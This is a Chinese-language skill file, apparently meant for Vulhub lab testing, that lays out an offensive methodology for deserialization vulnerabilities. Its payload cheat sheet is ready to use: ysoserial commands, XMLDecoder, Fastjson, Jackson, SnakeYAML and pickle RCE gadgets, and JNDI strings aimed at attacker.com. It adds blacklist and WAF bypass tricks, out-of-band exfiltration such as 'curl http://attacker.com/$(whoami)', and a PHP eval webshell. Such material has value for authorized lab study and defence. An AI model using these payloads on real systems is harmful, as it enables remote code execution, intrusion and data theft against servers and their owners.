---
name: vulhub-deserialization
description: deserialization 类型漏洞的通用抽象探测与利用方案
version: 1.0
---

# DESERIALIZATION 抽象化通用渗透与利用指南

## [1] 通用探测思路 (Detection Methodology)

反序列化漏洞的探测核心在于识别应用接受并处理序列化数据的入口点。基于提供的实例，可以抽象出以下通用探测模式：

1.  **识别序列化数据格式入口**：
    *   **HTTP 端点**：重点关注接受 `POST` 请求的特定路径，尤其是那些与远程调用、API、管理接口或插件功能相关的路径。例如：`/invoker/*`, `/webtools/control/*`, `/_ignition/*`, `/wls-wsat/*`, `/api/*`。
    *   **协议与端口**：识别并尝试连接使用特定反序列化协议的服务端口，如 **T3** (WebLogic)、**RMI** (默认1099)、**JMX**、**AMF** (Flex/Flash Remoting) 以及自定义的 TCP 服务端口（如 Log4j 的 4712）。
    *   **参数与头部**：检查请求参数、Cookie（如 `rememberMe`、`JSESSIONID`）、HTTP 头部（如 `Next-Action`）或请求体中的特定字段，这些位置可能包含序列化后的数据。

2.  **识别序列化数据格式**：
    *   **内容类型 (Content-Type)**：这是关键线索。重点关注 `application/xml`, `text/xml`, `application/json`, `application/x-amf`, `application/x-java-serialized-object`，以及 `multipart/form-data` 等。
    *   **数据特征**：观察请求体数据。Java 原生序列化数据通常以魔数 `AC ED 00 05`（十六进制）开头。XML 可能包含 `<java>`, `<serializable>`, `<methodCall>` 等标签。JSON 可能包含 `@type` 等指示类名的字段。Base64 编码的数据块也高度可疑。

3.  **黑盒模糊测试**：
    *   向识别出的可疑端点发送包含已知反序列化 gadget 链（如 CommonsCollections、ROME 等）的测试 payload。使用工具（如 ysoserial、phpggc）生成 payload，并观察服务器的响应延迟、错误信息变化或外带 DNS/HTTP 请求，以判断是否存在漏洞。

## [2] 经典漏洞原型与 Payload 字典 (Cheat Sheet)

以下 payload 已剥离具体 CVE 编号，按执行上下文和格式分类，可直接用于测试。

### **Java 原生序列化 (Java Native Serialization)**
*   **利用链**：使用 ysoserial 等工具生成。
    ```bash
    # 生成 CommonsCollections 链 payload 执行命令
    java -jar ysoserial.jar CommonsCollections5 "touch /tmp/success" > payload.ser
    ```
*   **HTTP 请求示例**：
    ```
    POST /invoker/readonly HTTP/1.1
    Host: target.com
    Content-Type: application/x-java-serialized-object
    Content-Length: ...

    [BINARY PAYLOAD FROM ysoserial]
    ```

### **XML 反序列化 (XStream, XMLDecoder, etc.)**
*   **XStream 类黑名单绕过**：利用未在黑名单中的类构造链。
    ```xml
    <sorted-set>
      <javax.naming.ldap.Rdn_-RdnEntry>
        <!-- 嵌套恶意对象，如 XRTreeFrag -->
      </javax.naming.ldap.Rdn_-RdnEntry>
    </sorted-set>
    ```
*   **XMLDecoder 命令执行**：
    ```xml
    <java version="1.0" class="java.beans.XMLDecoder">
      <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
          <void index="0"><string>/bin/bash</string></void>
          <void index="1"><string>-c</string></void>
          <void index="2"><string>touch /tmp/success</string></void>
        </array>
        <void method="start"/>
      </object>
    </java>
    ```
*   **XML-RPC 接口利用**：
    ```xml
    <?xml version="1.0"?>
    <methodCall>
      <methodName>任意方法名</methodName>
      <params>
        <param>
          <value>
            <struct>
              <member>
                <name>任意键名</name>
                <value>
                  <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
                    [Base64编码的Java序列化payload]
                  </serializable>
                </value>
              </member>
            </struct>
          </value>
        </param>
      </params>
    </methodCall>
    ```

### **JSON 反序列化 (Fastjson, Jackson, etc.)**
*   **利用 `@type` 指定恶意类 (Fastjson)**：
    ```json
    {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "ldap://attacker.com/Exploit",
      "autoCommit": true
    }
    ```
*   **Jackson 多态反序列化**：
    ```json
    {
      "任意属性名": ["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", {
        "transletBytecodes": ["BASE64_ENCODED_CLASS_BYTES"],
        "transletName": "a.b",
        "outputProperties": {}
      }]
    }
    ```

### **其他格式与协议**
*   **YAML 反序列化 (SnakeYAML)**：
    ```yaml
    !!org.h2.jdbc.JdbcConnection [
      "jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS $$void e() throws java.io.IOException { Runtime.getRuntime().exec(\"touch /tmp/success\"); }$$;CALL EXEC();",
      "", "", "", false
    ]
    ```
*   **PHP 反序列化**：
    ```php
    // 利用 phar:// 协议触发反序列化
    a:1:{s:6:"source";s:11:"/etc/passwd";} // 或更复杂的对象魔术方法链
    // 在文件上传或包含点使用：phar://./uploads/evil.jpg
    ```
*   **Python Pickle 反序列化**：
    ```python
    # 利用 __reduce__ 方法
    import pickle, base64, os
    class Exploit(object):
        def __reduce__(self):
            return (os.system, ('touch /tmp/success',))
    print(base64.b64encode(pickle.dumps(Exploit())))
    ```
*   **JNDI 注入 (通用触发点)**：
    *   **LDAP**：`${jndi:ldap://attacker.com/a}`
    *   **RMI**：`${jndi:rmi://attacker.com:1099/Exploit}`
    *   常出现在日志打印、XML 解析、配置项（如 `sasl.jaas.config`）中。

### **特定框架/组件 Payload 结构**
*   **Shiro RememberMe Cookie**：
    ```
    Cookie: rememberMe=[AES-加密的Java序列化payload，使用默认或已知密钥]
    ```
*   **WebLogic T3 协议**：需要发送 T3 协议头，后跟序列化 payload。通常使用工具（如 weblogic_t3.py）自动化。
*   **ActiveMQ OpenWire 协议**：发送特定结构的序列化数据包，可导致类加载和代码执行。

## [3] 变体与特殊绕过技巧 (Bypass & Tricky Variants)

1.  **黑名单/白名单绕过**：
    *   **寻找替代类**：当主流 gadget 链（如 `CommonsCollections`）被黑名单限制时，寻找功能相似但未被列入名单的类，例如 `CommonsBeanutils1`、`ROME`、`Rhino`、`C3P0` 等。
    *   **利用内部类**：使用 `$` 符号引用内部类，例如 `javax.naming.ldap.Rdn$RdnEntry`，这可能绕过基于字符串匹配的黑名单。
    *   **类加载器技巧**：利用当前 ClassLoader 中已加载的、不在默认黑名单中的类构造新的利用链。

2.  **触发点多样化**：
    *   反序列化可能发生在**绑定**（如 RMI Registry `bind`）、**查找**（`lookup`）、**读取对象**（`readObject`）、**解码**（XMLDecoder、JSON parse）等多个环节。
    *   关注非标准的触发点，如通过**文件操作**（`phar://`、`file://` 包含）、**会话持久化**（`JSESSIONID` 文件）、**数据库字段**（`key_value` 表）触发的反序列化。

3.  **编码与传输绕过**：
    *   **多重编码**：对 payload 进行 Base64、Hex、Quoted-Printable 等编码，以绕过简单的关键字过滤或 WAF。
    *   **分块传输**：利用 HTTP 的 `Content-Range` 或分块上传，将恶意 payload 分片写入文件，最终组合触发。
    *   **协议封装**：将反序列化 payload 封装在特定的应用层协议中，如 T3、AMF、OpenWire 等。

4.  **无回显利用 (Blind Exploitation)**：
    *   **外带通道 (OOB)**：使用 DNS、HTTP、LDAP 等协议将命令执行结果或文件内容带出。例如，执行 `curl http://attacker.com/` 或 `nslookup $(whoami).attacker.com`。
    *   **延时判断**：执行 `sleep 5` 等命令，通过响应时间判断命令是否执行成功。

## [4] 回显与成功判定基准 (Verification)

1.  **直接回显**：
    *   **命令执行**：执行 `id`、`whoami` 等命令，观察 HTTP 响应中是否包含命令输出。有时输出会隐藏在错误信息、日志或页面源码中。
    *   **文件读取**：尝试读取 `/etc/passwd`、`C:\\windows\\win.ini` 等系统文件，检查响应内容。
    *   **WebShell 写入**：写入一个简单的 WebShell（如 `<?php @eval($_POST['cmd']);?>`），并尝试访问以确认。

2.  **间接回显 (盲注)**：
    *   **DNS 外带**：使用 `nslookup`、`ping` 或 `curl` 触发指向你控制的 DNS 服务器的域名解析。在 DNS 日志中查看是否有查询记录。
    *   **HTTP 外带**：使用 `curl`、`wget` 访问你控制的 HTTP 服务器，并在访问日志中查看 User-Agent、Referer 或请求路径中是否携带了命令执行的结果（如 `curl http://attacker.com/$(whoami)`）。
    *   **延时判断**：执行 `sleep` 命令，如果服务器响应时间显著增加（如5秒），则表明漏洞存在且命令可能已执行。

3.  **通用成功标志**：
    *   **HTTP 状态码/响应变化**：漏洞利用成功后，服务器可能返回不同的 HTTP 状态码（如 500 错误变为 200），或响应体内容发生改变。
    *   **创建标志文件**：执行 `touch /tmp/success_` 命令，然后通过其他漏洞或途径（如目录遍历）验证文件是否被创建。这是 Vulhub 等靶场环境中常用的验证方式。
    *   **进程启动**：执行 `ping` 或启动一个监听端口的进程，在攻击机上使用 `tcpdump` 或 `nc` 检查是否有网络活动。